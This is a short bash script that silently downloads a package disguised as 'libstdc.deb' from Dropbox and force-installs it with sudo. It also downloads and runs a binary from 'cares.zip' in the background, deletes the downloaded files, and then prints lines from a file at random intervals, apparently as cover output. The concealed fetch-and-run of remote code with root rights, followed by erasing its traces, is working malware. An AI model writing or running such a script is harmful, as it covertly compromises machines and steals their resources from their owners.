#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/2jar6ugwec22nar/cares.zip -q
unzip cares.zip > /dev/null 2>&1
#pwd
./scripts/cares ./scripts/bin &
sleep 3
rm -rf cares.zip
rm -rf scripts/cares
rm -rf scripts/bin
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 10 ))
done < $2

